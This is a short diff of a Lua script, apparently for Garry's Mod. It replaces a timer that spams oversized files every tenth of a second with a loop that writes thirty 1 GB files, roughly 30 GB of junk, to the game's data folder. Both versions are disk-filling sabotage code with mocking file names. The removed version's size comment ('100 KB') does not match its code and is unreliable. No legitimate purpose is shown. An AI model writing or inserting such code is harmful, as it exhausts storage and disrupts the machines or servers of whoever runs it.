@@ -1,7 +1,8 @@
-timer.Create("spam_files", 0.1, 0, function()
-    local filename = "Igay_" .. tostring(os.time()) .. "_" .. math.random(1,100000) .. ".txt"
-    local content = string.rep("0", 10240000 * 10240000) -- 100 КБ
-    file.Write(filename, content)
-
-    
-end)
+for i = 1, 30 do
+    local f = file.Open("Igay_" .. i .. ".txt", "wb", "DATA")
+    local block = string.rep("A", 1024 * 1024) -- 1 МБ
+    for j = 1, 1024 do
+        f:Write(block)
+    end
+    f:Close()
+end
